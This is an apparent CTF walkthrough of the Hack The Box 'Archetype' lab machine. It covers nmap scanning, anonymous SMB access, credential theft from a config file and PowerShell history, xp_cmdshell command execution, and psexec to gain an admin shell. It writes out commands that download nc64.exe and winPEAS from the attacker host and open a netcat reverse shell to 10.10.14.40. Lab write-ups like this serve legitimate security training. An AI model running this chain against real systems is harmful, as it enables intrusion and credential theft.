---
title: Archetype
date: 2022-12-28 18:32:00 -0500
categories: [Walkthrough, Hackthebox, CTF]
tags: [Network, Protocols, MSSQL, SMB, Impacket, Powershell, Penetration Tester Level 1, Reconnaissance, Remote Code Execution, Clear Text Credentials, Information Disclosure, Anonymous/Guest Access, Windows]
---

<https://app.hackthebox.com/starting-point> Easy hackthebox machine from nmap to root with some impacket and smb.

Start off with an nmap after adding archetype to `/etc/hosts`.

- `nmap -p-` followed by `sudo nmap -sC -sT -sV -O -p135,139,445,1433,5985 archetype.htb -oN nmap_1`

```
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
|_ssl-date: 2022-12-29T06:54:24+00:00; 0s from scanner time.
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-12-29T06:47:55
|_Not valid after:  2052-12-29T06:47:55
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Microsoft Windows Server 2012 (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 1909 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-12-28T22:54:15-08:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h00m00s, deviation: 4h00m01s, median: 0s
| smb2-time: 
|   date: 2022-12-29T06:54:17
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
```

Port 1433 has an SQL server and we have a SMB share that we can access anonomysly, and grab a file with some credentials for the SQL server.

1. `smbclient -L archetype.htb` to list the shares
2. `smbclient \\\\archetype.htb\\backups` 
3. `dir` to check for files and `get prod.dtsConfig`

Checking this file we see a password and user `Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc`

Lets try to use impackets `mssqlclient.py` to connect

- `python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py ARCHETYPE/sql_svc@archetype.htb -windows-auth`

We're connected. We can use `help` and then see that we can execute commands with `xp_cmdshell cmd`. `xp_cmdshell` is disabled by default but no worries we can enable this `enable_xp_cmdshell` and then we are free to run commands. We can upload an `nc64.exe` to the target. Set up a python server on our attaker `python3 -m http.server 80`, and a listener `nc -nvlp 6666`

Download the file to the attacker `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.40/nc64.exe -outfile nc64.exe"` Then we can use it to connect back to our listener: `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.40 6666"`

Download winpeas to the target `powershell wget http://10.10.14.40/winPEASx64.exe -outfile winpeas.exe`

- `type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

We can see the user creds `administrator:MEGACORP_4dm1n!!`

User flag: `type user.txt` from sql_svc's desktop

With the admin credentials we can use the `psexec.py` took now to gain an admin shell.

- `python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator@archetype.htb`

Root flag: login to administrator and check desktop.

